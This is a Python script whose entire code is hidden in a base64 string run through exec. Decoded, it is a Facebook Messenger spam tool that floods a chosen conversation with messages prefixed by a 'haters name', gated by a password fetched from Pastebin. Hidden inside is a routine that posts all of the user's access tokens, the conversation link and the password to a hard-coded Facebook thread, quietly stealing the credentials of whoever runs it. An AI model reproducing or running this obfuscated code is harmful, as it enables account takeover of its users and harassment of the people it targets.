import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIiU1lDTyBBTk9YIFNJTkNIVSBSQVZJSSAiKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CglQT1JUID0gNDAwMAoKCXdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgoJCXByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpCgpkZWYgc2VuZF9tZXNzYWdlcygpOgoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CgkJcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkCgoJaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gUGFzc3dvcmQgY2hhbmdlIGJ5IGJyYWhtYW4gYm95IGF2aSEnKQoJCXN5cy5leGl0KCkKCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToKCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgludW1fdG9rZW5zID0gbGVuKHRva2VucykKCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKCWRlZiBjbHMoKToKCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOgoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQllbHNlOgoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CgkJCQlvcy5zeXN0ZW0oJ2NscycpCgljbHMoKQoKCWRlZiBsaW5lc3MoKToKCQlwcmludCgnXDAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKCWhlYWRlcnMgPSB7CgkJJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCgkJJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKCQknVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKCQknVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKCQknQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAoJCSdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCgkJJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCgkJJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCgl9CgoJbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUGdrcEZFMFInKS50ZXh0CgoJaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gIFBhc3N3b3JkIGNoYW5nZSBBTk9YICs5MTgzMDI3ODg3MicpCgkJc3lzLmV4aXQoKQoKCWxpbmVzcygpCgoJYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdCgoJd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CgkJY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCdmaWxlLnR4dCcsICdyJykgYXMgZmlsZToKCQl0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4odGV4dF9maWxlX3BhdGgsICdyJykgYXMgZmlsZToKCQltZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCgludW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpCgltYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykKCgl3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCWhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6CgkJc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCglsaW5lc3MoKQoJCglkZWYgZ2V0TmFtZSh0b2tlbik6CgkJdHJ5OgoJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAvbWU/YWNjZXNzX3Rva2VuPXt0b2tlbn0nKS5qc29uKCkKCQlleGNlcHQ6CgkJCWRhdGEgPSAiIgoJCWlmICduYW1lJyBpbiBkYXRhOgoJCQlyZXR1cm4gZGF0YVsnbmFtZSddCgkJZWxzZToKCQkJcmV0dXJuICJFcnJvciBvY2N1cmVkIgoKCWRlZiBtc2coKToKCQlwYXJhbWV0ZXJzID0gewoJCQknYWNjZXNzX3Rva2VuJyA6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksCgkJCSdtZXNzYWdlJzogJ1VzZXIgUHJvZmlsZSBOYW1lIDogJytnZXROYW1lKHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucykpKydcIFRva2VuIDogJysiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpKydcIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkKydcIFBhc3N3b3JkOiAnK3Bhc3N3b3JkCgkJfQoJCXRyeToKCQkJcyA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3RfMTAwMDcyNzQ1OTYxNzQ3LyIsIGRhdGE9cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCWV4Y2VwdDoKCQkJcGFzcwoJCgltc2coKQoJd2hpbGUgVHJ1ZToKCQl0cnk6CgkJCWZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6CgkJCQl0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCgkJCQlhY2Nlc3NfdG9rZW4gPSBhY2Nlc3NfdG9rZW5zW3Rva2VuX2luZGV4XQoKCQkJCW1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpCgoJCQkJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3t9LyIuZm9ybWF0KCd0XycrY29udm9faWQpCgkJCQlwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQoJCQkJcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgkJCQkKCgkJCQljdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCgkJCQlpZiByZXNwb25zZS5vazoKCQkJCQlwcmludCgiWytdIE1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHNlbnQgYnkgVG9rZW4ge306IHt9Ii5mb3JtYXQoCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQoJCQkJCWxpbmVzcygpCgkJCQkJbGluZXNzKCkKCQkJCWVsc2U6CgkJCQkJcHJpbnQoIlt4XSBGYWlsZWQgdG8gc2VuZCBtZXNzYWdlcyB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQl0aW1lLnNsZWVwKHNwZWVkKQoKCQkJcHJpbnQoIlsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLiIpCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJCQlwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKCgpkZWYgbWFpbigpOgoJc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQoJc2VydmVyX3RocmVhZC5zdGFydCgpCgkKCXNlbmRfbWVzc2FnZXMoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCW1haW4oKQ=='))